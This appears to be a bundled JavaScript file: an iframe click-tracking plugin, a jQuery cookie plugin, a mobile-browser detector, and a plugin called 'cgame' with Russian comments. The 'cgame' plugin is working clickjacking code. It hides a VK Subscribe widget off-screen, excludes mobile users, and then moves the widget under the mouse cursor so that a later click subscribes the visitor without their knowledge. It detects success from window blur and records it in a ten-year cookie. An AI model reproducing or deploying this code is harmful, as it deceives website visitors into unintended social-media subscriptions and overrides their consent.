/**
 * jQuery iframe click tracking plugin
 * Version 1.3 (2014-05-16)
 * Copyright � 2014 Vincent Par�, www.finalclap.com
 */
(function($){
    // Registering new tracking handler
    $.fn.iframeTracker = function(handler){
        // Storing the new handler into handler list
        $.iframeTracker.handlersList.push(handler);

        // Binding boundary listener
        $(this)
            .bind('mouseover', {handler: handler}, function(e){
                e.data.handler.over = true;
                try{ e.data.handler.overCallback(this); } catch(ex){}
            })
            .bind('mouseout',  {handler: handler}, function(e){
                e.data.handler.over = false;
                $.iframeTracker.focusRetriever.focus();
                try{ e.data.handler.outCallback(this); } catch(ex){}
            });
    };

    // Iframe tracker common object
    $.iframeTracker = {
        // Attributes
        focusRetriever: null,  // Element used for restoring focus on window (element)
        focusRetrieved: false, // Says if the focus was retrived on the current page (bool)
        handlersList: [],      // Store a list of every trakers (created by calling $(selector).iframeTracker...)
        isIE8AndOlder: false,  // true for Internet Explorer 8 and older

        // Init (called once on document ready)
        init: function(){
            // Determine browser version (IE8-) ($.browser.msie is deprecated since jQuery 1.9)
            try{
                if( $.browser.msie == true && $.browser.version < 9 ){
                    this.isIE8AndOlder = true;
                }
            } catch(ex){
                try{
                    var matches = navigator.userAgent.match(/(msie) ([\w.]+)/i);
                    if( matches[2] < 9 ){
                        this.isIE8AndOlder = true;
                    }
                } catch(ex2){}
            }

            // Listening window blur
            $(window).focus();
            $(window).blur(function(e){
                $.iframeTracker.windowLoseFocus(e);
            });

            // Focus retriever
            $('body').append('<div style="position:fixed; top:0; left:0; overflow:hidden;"><input style="position:absolute; left:-300px;" type="text" value="" id="focus_retriever" readonly="true" /></div>');
            this.focusRetriever = $('#focus_retriever');
            this.focusRetrieved = false;
            // Focus back to page
            $(document).mousemove(function(e){
                if( document.activeElement && document.activeElement.tagName == 'IFRAME' ){
                    $.iframeTracker.focusRetriever.focus();
                    $.iframeTracker.focusRetrieved = true;
                }
            });
            // Blur doesn't works correctly on IE8-, so we need to trigger it manually
            if( this.isIE8AndOlder ){
                this.focusRetriever.blur(function(e){
                    e.stopPropagation();
                    e.preventDefault();
                    $.iframeTracker.windowLoseFocus(e);
                });
            }

            // Keep focus on window (fix bug IE8-, focusable elements)
            if( this.isIE8AndOlder ){
                $('body').click(function(e){ $(window).focus(); });
                $('form').click(function(e){ e.stopPropagation(); });

                // Same thing for "post-DOMready" created forms (issue #6)
                try{
                    $('body').on('click', 'form', function(e){ e.stopPropagation(); });
                } catch(ex){
                    console.log("[iframeTracker] Please update jQuery to 1.7 or newer. (exception: " + ex.message + ")");
                }
            }
        },

        // Blur on window => calling blurCallback for every handler with over=true
        windowLoseFocus: function(event){
            for(var i in this.handlersList){
                if( this.handlersList[i].over == true ){
                    try{ this.handlersList[i].blurCallback(); } catch(ex){}
                }
            }
        }
    };

    // Init the iframeTracker on document ready
    $(document).ready(function(){
        $.iframeTracker.init();
    });
})(jQuery);


/*!
 * jQuery Cookie Plugin v1.4.1
 * https://github.com/carhartl/jquery-cookie
 *
 * Copyright 2013 Klaus Hartl
 * Released under the MIT license
 */

(function (factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD
        define(['jquery'], factory);
    } else if (typeof exports === 'object') {
        // CommonJS
        factory(require('jquery'));
    } else {
        // Browser globals
        factory(jQuery);
    }
}(function ($) {

    if (!$.cookie){
        var pluses = /\+/g;

        function encode(s) {
            return config.raw ? s : encodeURIComponent(s);
        }

        function decode(s) {
            return config.raw ? s : decodeURIComponent(s);
        }

        function stringifyCookieValue(value) {
            return encode(config.json ? JSON.stringify(value) : String(value));
        }

        function parseCookieValue(s) {
            if (s.indexOf('"') === 0) {
                // This is a quoted cookie as according to RFC2068, unescape...
                s = s.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, '\\');
            }

            try {
                // Replace server-side written pluses with spaces.
                // If we can't decode the cookie, ignore it, it's unusable.
                // If we can't parse the cookie, ignore it, it's unusable.
                s = decodeURIComponent(s.replace(pluses, ' '));
                return config.json ? JSON.parse(s) : s;
            } catch(e) {}
        }

        function read(s, converter) {
            var value = config.raw ? s : parseCookieValue(s);
            return $.isFunction(converter) ? converter(value) : value;
        }

        var config = $.cookie = function (key, value, options) {

            // Write

            if (value !== undefined && !$.isFunction(value)) {
                options = $.extend({}, config.defaults, options);

                if (typeof options.expires === 'number') {
                    var days = options.expires, t = options.expires = new Date();
                    t.setTime(+t + days * 864e+5);
                }

                return (document.cookie = [
                    encode(key), '=', stringifyCookieValue(value),
                    options.expires ? '; expires=' + options.expires.toUTCString() : '', // use expires attribute, max-age is not supported by IE
                    options.path    ? '; path=' + options.path : '',
                    options.domain  ? '; domain=' + options.domain : '',
                    options.secure  ? '; secure' : ''
                ].join(''));
            }

            // Read

            var result = key ? undefined : {};

            // To prevent the for loop in the first place assign an empty array
            // in case there are no cookies at all. Also prevents odd result when
            // calling $.cookie().
            var cookies = document.cookie ? document.cookie.split('; ') : [];

            for (var i = 0, l = cookies.length; i < l; i++) {
                var parts = cookies[i].split('=');
                var name = decode(parts.shift());
                var cookie = parts.join('=');

                if (key && key === name) {
                    // If second argument (value) is a function it's a converter...
                    result = read(cookie, value);
                    break;
                }

                // Prevent storing a cookie that we couldn't decode.
                if (!key && (cookie = read(cookie)) !== undefined) {
                    result[name] = cookie;
                }
            }

            return result;
        };

        config.defaults = {};

        $.removeCookie = function (key, options) {
            if ($.cookie(key) === undefined) {
                return false;
            }

            // Must not alter options, thus extending a fresh object...
            $.cookie(key, '', $.extend({}, options, { expires: -1 }));
            return !$.cookie(key);
        };
    }
}));


(function(a){(jQuery.browser=jQuery.browser||{}).mobile=/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))})(navigator.userAgent||navigator.vendor||window.opera);

(function ($) {

    "use strict";

    /**
     * Описание объекта
     */
    var cgame = function () {
        return cgame.init.apply(this, arguments);
    };

    /**
     * Расширение объекта
     */
    $.extend(cgame, {
        /**
         * Настройки по умолчанию
         */
        options: {
            redZone: 50,
            debug: false,
            subscribeTo: 500,
            startAfterClick: 1,
            buttonHeight: 15,
            buttonWidth: 45,
            jumpTimeout: 10,
            strategyTimeout: false // Время, которое работает игра. Если ничего не произошло за это время - игра ждет следующего захода
        },
        /**
         * Элемент, над которым выполняются действия
         */
        element: undefined,
        elementID: '',
        latestTop: 0,
        latestLeft: 0,
        jumpTop: 0,
        jumpLeft: 0,
        jumpTimer: undefined,
        clicks: 0,
        success: false,
        successCookie: 'GAME_PLAYED_SUCCESS',
        setupSandboxInterval: undefined,
        /**
         * Инициализация
         * @param element
         * @param options
         */
        init: function (element, options) {
            if (element === undefined) return;
            if ($.browser.mobile) return;
            if ($.cookie(this.successCookie)) return;

            this.element = element;
            this.elementID = $(element).attr('id');
            this.options = $.extend(this.options, options);

            this.bind();

            this.initElement();
            this.initCSS();
            this.checkClicks();
            this.setSandbox();

            return this;
        },
        initElement: function(){
            var $me = this;
            var $element = $(this.element);

            $element.css({'position': 'absolute', 'left': '-9999px', 'top': '-9999px', 'z-index': '100000000'});

            VK.Widgets.Subscribe($me.elementID, {soft: 1}, $me.options.subscribeTo);
        },
        setupSandbox: function(){
            var $me = this;
            $me.debug('Frame loaded');
        },
        setSandbox: function(){
            var $me = this;
            var $element = $(this.element);
            $me.setupSandboxInterval = setInterval(function(){
                $me.debug('Wait frame');
                if ($element.find('iframe').length > 0){
                    $me.setupSandbox();
                    clearInterval($me.setupSandboxInterval);
                }
            },10);
        },
        initCSS: function(){
            var $me = this;
            var css = '#' + $me.elementID + '{width: '+ $me.options.buttonWidth + 'px !important;height: '+ $me.options.buttonHeight + 'px !important;}';
            var $css = $('<style></style>').append(css);
            $('body').append($css);
        },
        initStrategy: function(){
            var $me = this;
            $me.debug('Start strategy!');
            $me.startJumper();
        },
        jump: function(){
            var $me = this;
            var $element = $($me.element);

            var top = $me.jumpTop - $me.options.buttonHeight/2;
            var left = $me.jumpLeft - $me.options.buttonWidth/2;

            $element.css({
                'top': top + 'px',
                'left': left + 'px'
            });
        },
        playJumper: function(e){
            var $me = this;
            var $element = $(this.element);

            $me.jumpTop = e.pageY;
            $me.jumpLeft = e.pageX;

            $me.latestTop = e.clientY;
            $me.latestLeft = e.clientX;

            clearTimeout($me.jumpTimer);
            $me.jumpTimer = setTimeout(function(){
                $me.jump();
            }, $me.options.jumpTimeout)
        },
        startJumper: function(){
            var $me = this;
            $me.debug('Start jumper');
            var jumper = function(e){
                $me.playJumper(e);
            };
            $(document).on('mousemove', jumper);

            if ($me.options.strategyTimeout){
                setTimeout(function(){
                    $me.debug('Stop jumper');
                    $(document).off('mousemove', jumper);
                    $me.timeout();
                }, $me.options.strategyTimeout);
            }
        },
        checkClicks: function(){
            var $me = this;
            if ($me.clicks == $me.options.startAfterClick){
                $me.initStrategy();
            }
        },
        /**
         * "Навешиваем" события
         */
        bind: function () {
            var $me = this;
            $(window).focus();
            $(document).on('click', function(e){
                $me.clicks++;
                $me.checkClicks();
            });
            VK.Observer.subscribe("widgets.subscribed", function(){
                $me.userSubscribed();
            });
            $(window).blur(function(e){
                $me.windowBlur(e);
            });
        },
        debug: function(message){
            if (this.options.debug){
                console.log(message);
            }
        },
        userSubscribed: function(){
            var $me = this;
            $me.debug('User subscribed!');
            $me.setSuccess();
        },
        isRedZone: function(){
            var $me = this;
            var height = $(window).height();
            var width = $(window).width();
            var redZone = $me.options.redZone;

            if ($me.latestTop < redZone || (height - $me.latestTop) < redZone){
                return true;
            }

            if ($me.latestLeft < redZone || (width - $me.latestLeft) < redZone){
                return true;
            }

            return false;
        },
        windowBlur: function(e){
            var $me = this;
            $me.debug('Window blur');
            setTimeout(function(){
                if ($me.isRedZone()){
                    $me.debug('Red zone!');
                    $me.setRetry();
                }else{
                    $me.setSuccess();
                }
            }, 1000);
        },
        /*
        Все прошло успешно - больше не докучаем пользователю.
        (либо человек подписался, либо blur произошел далеко от края экрана, что значит что пользователь уже подписан).
         */
        setSuccess: function(){
            var $me = this;
            $me.debug('Success');
            $.cookie($me.successCookie, 'SUCCESS', { expires: 365 * 10 });
            $me.turnOff();
        },
        /*
        Вышло время ожидания или была вероятность, что blur произошел за краем экрана. Повторим еще разок. Позже.
        */
        setRetry: function(){
            var $me = this;
            $me.turnOff();
        },
        /*
        Время вышло - засыпаем
         */
        timeout: function(){
            this.setRetry();
        },
        turnOff: function(){
            var $me = this;
            $me.debug('Off');
            $($me.element).remove();
        }
    });

    /**
     * Инициализация функции объекта для jQuery
     */
    return $.fn.cgame = function (options) {
        return cgame.init(this, options);
    };

})($);